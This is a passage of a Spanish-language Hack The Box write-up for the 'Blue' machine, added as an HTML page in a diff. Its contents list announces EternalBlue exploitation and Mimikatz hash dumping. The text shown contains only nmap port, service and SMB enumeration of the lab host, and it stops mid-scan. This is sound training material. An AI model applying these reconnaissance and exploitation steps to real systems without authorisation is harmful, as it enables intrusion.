@@ -1,0 +1,1577 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blue - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-blue/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Blue - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-blue/blue_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-remote/">
+          <span class="side-post-card-title">Remote</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-bountyhunter/">
+          <span class="side-post-card-title">Bounty Hunter</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Blue</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-netmon/">
+          <span class="side-post-card-title">Netmon</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-jerry/">
+          <span class="side-post-card-title">Jerry</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Blue - Hack The Box</h1>
+    <div class="post-meta">18 January 2023 · 25 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-blue/blue_logo.png" alt="Blue - Hack The Box">
+  
+
+  
+  <p class="post-lead">Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia detrás de su obtención, siendo que este Exploit supuestamente fue robado a la NCA. Haremos uso del famoso Exploit Eternal Blue para ganar acceso como un usuario administrador, aprovecharemos para utilizar otras herramientas para obtener información sobre el servicio SMB y la máquina.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>smbclient</code></li><li><code>python2</code></li><li><code>Impacket</code></li><li><code>rlwrap</code></li><li><code>msfvenom</code></li><li><code>nc</code></li><li><code>metasploit framework</code></li><li><code>Módulo: auxiliary/scanner/smb/smb_ms17_010)</code></li><li><code>Módulo: exploit/windows/smb/ms17_010_eternalblue</code></li><li><code>mimikatz.exe</code></li><li><code>certutil.exe</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#smb">Analizando y Probando Servicio SMB</a></li>
+        <li><a href="#herra">Probando Herramienta smbclient</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Buscando y Configurando un Exploit</a></li>
+        <li><a href="#exploit1">Probando Exploit EternalBlue de GitHub</a></li>
+        <li><a href="#exploit2">Probando Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &lsquo;EternalBlue&rsquo; SMB Remote Code Execution (MS17-010)</a></li>
+        <li><a href="#exploit3">Probando EternalBlue en Metasploit Framework</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#mimik">Dumpeando Hashes con Módulo Kiwi en Metasploit Framework</a></li>
+        <li><a href="#mimik2">Usando Mimikatz en Máquina Víctima</a></li>
+        <li><a href="#mimik3">Cargando Mimikatz desde Nuestra Máquina</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#smb">Analizando y Probando Servicio SMB</a></li>
+        <li><a href="#herra">Probando Herramienta smbclient</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Buscando y Configurando un Exploit</a></li>
+        <li><a href="#exploit1">Probando Exploit EternalBlue de GitHub</a></li>
+        <li><a href="#exploit2">Probando Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &lsquo;EternalBlue&rsquo; SMB Remote Code Execution (MS17-010)</a></li>
+        <li><a href="#exploit3">Probando EternalBlue en Metasploit Framework</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#mimik">Dumpeando Hashes con Módulo Kiwi en Metasploit Framework</a></li>
+        <li><a href="#mimik2">Usando Mimikatz en Máquina Víctima</a></li>
+        <li><a href="#mimik3">Cargando Mimikatz desde Nuestra Máquina</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Veamos si la máquina está conectada, lancemos un ping y veamos que SO opera gracias al TTL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.10.40 
+</span></span><span style="display:flex;"><span>PING 10.10.10.40 <span style="color:#f92672">(</span>10.10.10.40<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.40: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.40: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">130</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.40: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">130</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.40: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.10.40 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3005ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 128.426/129.686/130.894/0.884 ms
+</span></span></code></pre></div><p>Vemos que la máquina tiene el sistema Windows, empecemos ahora con los escaneos.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<p>Vamos a buscar que puertos están abiertos en esta máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.40 -oG allPorts             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-01-18 13:28 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 13:28
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.40 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 10.10.10.40
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.10.10.40
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.10.10.40
+</span></span><span style="display:flex;"><span>Discovered open port 49156/tcp on 10.10.10.40
+</span></span><span style="display:flex;"><span>Discovered open port 49154/tcp on 10.10.10.40
+</span></span><span style="display:flex;"><span>Discovered open port 49152/tcp on 10.10.10.40
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 13:29, 48.37s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.40
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.59s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-01-18 13:28:52 CST <span style="color:#66d9ef">for</span> 49s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">41657</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">23872</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      REASON
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>49156/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 48.61 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">227709</span> <span style="color:#f92672">(</span>10.019MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">24244</span> <span style="color:#f92672">(</span>969.820KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Vemos varios puertos abiertos, pero ya podemos deducir que la máquina usa el <strong>servicio SMB</strong>. Ahora vamos al escaneo de servicios.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<p>Aplicando escaneo de servicios a los puertos abiertos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p135,139,445,49152,49154,49156 10.10.10.40 -oN targeted              
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-01-18 13:31 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.40
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49156/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Professional 6.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+</span></span><span style="display:flex;"><span>|   Computer name: haris-PC
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: HARIS-PC<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2023-01-18T19:32:34+00:00
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   210: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2023-01-18T19:32:33
+</span></span><span style="display:flex;"><span>|_  start_date: 2023-01-18T19:27:28
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 5s, deviation: 1s, median: 4s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 74.54 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí vemos que se usa el <strong>servicio SMB</strong> bastante, podemos ver información extra sobre el <strong>SMB</strong>, veamos un par de cositas que nos dice este escaneo.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="smb">Analizando y Probando Servicio SMB</h3>
+<p>Vamos a aplicar unos scripts de <strong>nmap</strong> para obtener más información sobre el <strong>servicio SMB</strong>, pruebalos:</p>
+<ul>
+<li><strong>Script de reconocimiento de protocolos SMB</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">445</span> --script smb-protocols 10.10.10.40
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.40
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.063s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb-protocols: 
+</span></span><span style="display:flex;"><span>|   dialects: 
+</span></span><span style="display:flex;"><span>|     NT LM 0.12 <span style="color:#f92672">(</span>SMBv1<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>dangerous, but default<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">202</span>
+</span></span><span style="display:flex;"><span>|_    <span style="color:#ae81ff">210</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 3.95 seconds
+</span></span></code></pre></div><p>Este script muestra el protocolo de red que usa el <strong>servicio SMB</strong>, existen varios como el <strong>SMBv1, SMBv2, SMBv2.1, SMBv3 y SMBv3.X</strong>. El <strong>SMBv1</strong> es el más vulnerable y es el que nos será útil más adelante.</p>
+<ul>
+<li><strong>Script de reconocimiento de seguridad de SMB</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">445</span> --script smb-security-mode 10.10.10.40
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.40
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.063s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.64 seconds
+</span></span></code></pre></div><p>Este script nos va a mostrar el modo de seguridad que usa el <strong>servicio SMB</strong>, existen varios como la sin seguridad (None), autenticación (Authentication), firma de mensajes (Message Signing) y cifrado (Encryption).</p>
+<p>Observa que en este caso, tiene activado el modo de autenticación activado, pero la firma de mensajes esta desactivada, lo cual es peligroso tal y como nos menciona el script, pues puede haber riesgo de manipulación de datos, suplantación de identidad y se puede compremeter la integridad de las comunicaciones.</p>
+<p>En este caso, el nivel de autenticación es por invitado, es decir, que nos podemos conectar al <strong>servicio SMB</strong>, lo probaremos más adelante.</p>
+<ul>
+<li><strong>Script de reconocimiento de recursos compartidos</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">445</span> --script smb-enum-shares 10.10.10.40
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.40
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.077s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb-enum-shares: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.10.40<span style="color:#ae81ff">\A</span>DMIN$: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_DISKTREE_HIDDEN
+</span></span><span style="display:flex;"><span>|     Comment: Remote Admin
+</span></span><span style="display:flex;"><span>|     Anonymous access: &lt;none&gt;
+</span></span><span style="display:flex;"><span>|     Current user access: &lt;none&gt;
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">\\</span>10.10.10.40<span style="color:#ae81ff">\C</span>$: 
+</span></span><span style="display:flex;"><span>|     Type: STYPE_DISKTREE_HIDDEN
+</span></span><span style="display:flex;"><span>|     Comment: Default share
+</span></span><span style="display:flex;"><span>|     Anonymous access: &lt;none&gt;
+</span></span><span style="display:flex;"><span>|     Current user access: &lt;none&gt;
